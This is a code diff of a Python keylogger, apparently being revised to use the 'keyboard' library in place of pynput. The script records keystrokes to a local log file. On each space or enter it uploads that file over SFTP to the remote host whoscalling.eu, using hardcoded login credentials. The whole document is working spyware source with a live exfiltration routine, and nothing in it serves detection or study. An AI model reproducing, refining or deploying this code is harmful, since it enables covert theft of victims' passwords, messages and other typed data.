@@ -1,7 +1,7 @@
 import os
+import string
+import keyboard
 import paramiko
-from pynput.keyboard import Listener
-
 
 
 def osDetect():
@@ -20,32 +20,36 @@ def outreach():
     ssh.load_host_keys(os.path.expanduser(os.path.join("~", ".ssh", "known_hosts")))
     ssh.connect('whoscalling.eu', username='log', password='logpass13')
     sftp = ssh.open_sftp()
-    sftp.put(f'{os.getcwd()}{osDetect()}log.txt', 'log.txt')
+    sftp.put(f'{os.getcwd()}{osDetect()}logg2.txt', 'log.txt')
     sftp.close()
     ssh.close()
 
 
-def keylogger(Listener):
+def keylogger():
+    allchars = string.ascii_lowercase + string.ascii_uppercase + string.digits
 
-    def on_press(key):
-        while True:
-            file = open('log.txt', 'a', encoding='utf-8')
-            k = str(key).replace("'", "")
-            if k.find("space") > 0:
-                file.write(" ")
-            elif k.find("enter") > 0:
-                file.write("\n")
+    while True:
+        file = open(f'{os.getcwd()}{osDetect()}logg2.txt', 'a')
+
+        event = keyboard.read_event()
+
+        if event.event_type == keyboard.KEY_DOWN:
+            char = keyboard.read_key()
+            for i in allchars:
+                if char == i:
+                    file.write(char)
+
+            if event.name == 'space':
+                char = '\n'
                 outreach()
-            elif k.find("Key") == -1:
-                file.write(k)
+
+
+            elif event.name == 'enter':
+                char = '\n'
+                outreach()
+
             file.close()
-            
-    Listener = Listener(on_press=on_press)
-    Listener.join()
-
-
 
 
 if __name__ == '__main__':
-
-    keylogger(Listener)
+    keylogger()
